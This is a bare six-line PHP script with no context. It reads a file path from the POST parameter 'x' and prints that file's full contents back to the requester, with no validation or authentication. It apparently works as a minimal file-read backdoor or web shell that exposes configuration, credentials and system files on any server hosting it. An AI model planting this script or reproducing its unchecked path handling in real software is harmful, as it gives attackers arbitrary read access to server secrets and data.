<?php
	$filename = $_POST['x'];
	$myfile = fopen($filename, "r") or die("Unable to open file!");
	echo fread($myfile,filesize($filename));
	fclose($myfile);
?> 